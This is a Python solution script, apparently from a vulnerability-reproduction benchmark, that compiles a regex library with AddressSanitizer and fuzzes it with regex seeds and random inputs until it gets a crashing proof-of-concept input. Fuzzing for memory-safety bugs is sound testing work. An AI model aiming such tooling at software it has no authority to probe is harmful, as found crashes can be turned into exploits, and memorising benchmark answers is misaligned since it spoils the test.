import os
import sys
import subprocess
import tarfile
import tempfile
import random
import shutil
import time
import glob
import itertools
from concurrent.futures import ThreadPoolExecutor

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Create a temporary directory for building
        build_dir = tempfile.mkdtemp()
        
        try:
            # Extract source
            if os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tgz') or src_path.endswith('.tar')):
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=build_dir)
            elif os.path.isdir(src_path):
                shutil.copytree(src_path, os.path.join(build_dir, "source"), dirs_exist_ok=True)
            else:
                # If it's a single file or unknown, copy it in
                if os.path.isfile(src_path):
                    shutil.copy(src_path, build_dir)

            # Locate source root (directory containing configure, Makefile, etc.)
            src_root = build_dir
            for root, dirs, files in os.walk(build_dir):
                if 'configure' in files or 'Makefile' in files or 'CMakeLists.txt' in files:
                    src_root = root
                    break
            
            # Setup environment for ASan compilation
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            env['CFLAGS'] = '-fsanitize=address,undefined -g -O1'
            env['CXXFLAGS'] = '-fsanitize=address,undefined -g -O1'
            env['LDFLAGS'] = '-fsanitize=address,undefined'
            
            # Attempt to build the target
            built = False
            
            # 1. Configure (common for PCRE/open source projects)
            # Ensure JIT is enabled as the vulnerability description often relates to JIT or specific engine features
            if os.path.exists(os.path.join(src_root, 'configure')):
                # Try with JIT enabled if possible
                subprocess.run(['./configure', '--enable-jit', '--disable-shared', '--enable-static'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
            
            # 2. CMake
            if not built and os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
                cmake_build = os.path.join(src_root, 'build_cmake')
                os.makedirs(cmake_build, exist_ok=True)
                subprocess.run(['cmake', '..'], cwd=cmake_build, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=cmake_build, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
                
            # 3. Makefile (fallback)
            if not built and os.path.exists(os.path.join(src_root, 'Makefile')):
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True

            # 4. Direct compilation if no build system (scan for .c/.cc files)
            if not built:
                src_files = []
                for root, dirs, files in os.walk(src_root):
                    for f in files:
                        if f.endswith('.c') or f.endswith('.cc') or f.endswith('.cpp'):
                            src_files.append(os.path.join(root, f))
                if src_files:
                    subprocess.run(['clang++', '-fsanitize=address,undefined', '-g', '-o', 'vuln'] + src_files, cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Identify the executable
            candidates = []
            for root, dirs, files in os.walk(build_dir):
                for f in files:
                    fp = os.path.join(root, f)
                    if os.access(fp, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py') and not f.endswith('.o') and not f.endswith('.so') and not f.endswith('.a'):
                        candidates.append(fp)
            
            target = None
            # Prioritize executables that look like fuzzers or test harnesses
            prefs = ['fuzz', 'test', 'pcre2test', 'vuln']
            for p in prefs:
                for c in candidates:
                    if p in os.path.basename(c).lower():
                        target = c
                        break
                if target: break
            
            if not target and candidates:
                target = candidates[0]
            
            if not target:
                return b""

            # Fuzzing Logic
            # The vulnerability involves regex and ovector, usually triggered by recursion or backreferences.
            
            # 1. Check specific seeds
            seeds = [
                b"(?1)", b"((?1))", b"()", b"(\\1)", b"\\1", 
                b"((?1))", b"(?R)", b"\\g<1>", b"\\k<1>",
                b"(a)\\1", b"\\C", b"\\", b"[a-z]", 
                b"(?1)(?1)", b"((?1)(?1))", 
                b"\\((?1)\\)", b"(((?1)))",
            ]
            
            for s in seeds:
                if self.check(target, s):
                    return s

            # 2. Targeted generation
            # Alphabet focused on regex special characters
            alpha = b"()?*|.\\^$[]" + b"1" 
            
            # Use ThreadPoolExecutor for parallel execution
            start_time = time.time()
            max_time = 45 # seconds
            
            with ThreadPoolExecutor(max_workers=8) as executor:
                # Batch 1: Exhaustive short lengths
                for l in range(1, 6):
                    # Only do random sampling for larger spaces, full for small
                    if l < 4:
                        inputs = [bytes(p) for p in itertools.product(alpha, repeat=l)]
                        # Check in batches
                        for i in range(0, len(inputs), 50):
                            batch = inputs[i:i+50]
                            results = list(executor.map(lambda x: (x, self.check(target, x)), batch))
                            for inp, crashed in results:
                                if crashed: return inp
                    else:
                         # Random sampling for length 4, 5
                        batch = [bytes(random.choice(alpha) for _ in range(l)) for _ in range(200)]
                        results = list(executor.map(lambda x: (x, self.check(target, x)), batch))
                        for inp, crashed in results:
                            if crashed: return inp
                
                # Batch 2: General random fuzzing
                while time.time() - start_time < max_time:
                    l = random.randint(1, 12)
                    # Mix regex chars with some ASCII
                    full_alpha = alpha + b"abcdef0123456789"
                    batch = [bytes(random.choice(full_alpha) for _ in range(l)) for _ in range(50)]
                    results = list(executor.map(lambda x: (x, self.check(target, x)), batch))
                    for inp, crashed in results:
                        if crashed: return inp

        except Exception:
            pass
        finally:
            shutil.rmtree(build_dir, ignore_errors=True)
            
        return b""

    def check(self, exe, data):
        tmp_name = ""
        try:
            # Create unique temp file
            fd, tmp_name = tempfile.mkstemp()
            os.write(fd, data)
            os.close(fd)
            
            # Try passing as file argument
            # Capture stderr to check for ASan report
            p = subprocess.run([exe, tmp_name], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
            if p.returncode != 0 and b"AddressSanitizer" in p.stderr:
                os.unlink(tmp_name)
                return True
            
            # Try piping via stdin
            p = subprocess.run([exe], input=data, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
            if p.returncode != 0 and b"AddressSanitizer" in p.stderr:
                os.unlink(tmp_name)
                return True

            os.unlink(tmp_name)
        except Exception:
            if os.path.exists(tmp_name):
                try:
                    os.unlink(tmp_name)
                except:
                    pass
        return False
